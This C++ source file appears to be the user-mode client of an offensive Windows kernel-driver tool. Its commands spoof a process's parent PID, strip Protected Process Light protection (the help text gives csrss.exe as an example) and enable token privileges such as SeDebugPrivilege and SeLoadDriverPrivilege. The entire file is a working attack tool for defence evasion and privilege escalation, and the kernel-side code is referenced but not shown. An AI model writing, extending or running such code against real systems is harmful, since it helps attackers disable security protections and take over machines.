#include <print>
#include <memory>
#include <string>
#include <string_view>
#include "../Memory/DriverInterface/driver_interface.hpp"

static void print_help( std::string_view prog )
{
	std::print( R"({0} - Tamper with process attributes via kernel driver.

Description:
  Modifies EPROCESS fields from kernel mode. Supports spoofing the
  parent PID, removing PPL protection, and toggling token privileges.

Usage:
  {0} spoof-ppid <pid> <new_parent_pid>    Spoof the parent PID
  {0} bypass-ppl <pid>                      Remove PPL protection
  {0} toggle-priv <pid> <luid> <0|1>        Toggle a token privilege
  {0} --help                                Show this help

Arguments:
  pid             Target process ID
  new_parent_pid  PID to set as the new parent
  luid            Privilege LUID (e.g. 20 = SeDebugPrivilege)
  0|1             0 = disable, 1 = enable

Common privilege LUIDs:
  20  SeDebugPrivilege          Debug other processes
  29  SeLoadDriverPrivilege     Load kernel drivers
  17  SeBackupPrivilege         Read any file
  18  SeRestorePrivilege        Write any file
  35  SeImpersonatePrivilege    Impersonate tokens

Examples:
  {0} spoof-ppid 1234 4            Make PID 1234 appear child of System
  {0} bypass-ppl 808               Remove PPL from csrss.exe (PID 808)
  {0} toggle-priv 1234 20 1        Enable SeDebugPrivilege for PID 1234
)", prog );
}

int main( int argc, char* argv[] )
{
	if( argc < 2 || std::string_view{ argv[1] } == "--help" || std::string_view{ argv[1] } == "-h" )
	{
		print_help( argv[0] );
		return ( argc > 1 ) ? 0 : 1;
	}

	const auto driver = std::make_unique< driver_interface >();

	if( !driver->is_connected() )
	{
		std::println( "[!] Could not connect to the driver!" );
		return 1;
	}

	const auto cmd = std::string_view{ argv[1] };

	if( cmd == "spoof-ppid" )
	{
		if( argc < 4 )
		{
			std::println( "[!] Usage: {} spoof-ppid <pid> <new_parent_pid>", argv[0] );
			return 1;
		}

		const auto pid = static_cast< DWORD >( std::stoul( argv[2] ) );
		const auto new_ppid = std::stoull( argv[3] );

		if( auto prev = driver->spoof_parent_pid( pid, new_ppid ) )
			std::println( "[+] Spoofed parent PID of {} from {} to {}.", pid, *prev, new_ppid );
		else
		{
			std::println( "[!] Failed to spoof parent PID." );
			return 1;
		}
	}
	else if( cmd == "bypass-ppl" )
	{
		if( argc < 3 )
		{
			std::println( "[!] Usage: {} bypass-ppl <pid>", argv[0] );
			return 1;
		}

		const auto pid = static_cast< DWORD >( std::stoul( argv[2] ) );

		if( auto prev = driver->bypass_ppl( pid ) )
			std::println( "[+] Removed PPL from PID {}. Previous protection: 0x{:X}.", pid, *prev );
		else
		{
			std::println( "[!] Failed to bypass PPL." );
			return 1;
		}
	}
	else if( cmd == "toggle-priv" )
	{
		if( argc < 5 )
		{
			std::println( "[!] Usage: {} toggle-priv <pid> <luid> <0|1>", argv[0] );
			return 1;
		}

		const auto pid    = static_cast< DWORD >( std::stoul( argv[2] ) );
		const auto luid   = std::stoull( argv[3] );
		const auto enable = std::string_view{ argv[4] } == "1";

		if( auto prev = driver->toggle_privilege( pid, luid, enable ) )
		{
			std::println( "[+] {} privilege LUID {} for PID {}. Previous state: 0x{:X}.",
				enable ? "Enabled" : "Disabled", luid, pid, *prev );
		}
		else
		{
			std::println( "[!] Failed to toggle privilege." );
			return 1;
		}
	}
	else
	{
		std::println( "[!] Unknown command '{}'. Use --help for usage.", cmd );
		return 1;
	}

	return 0;
}
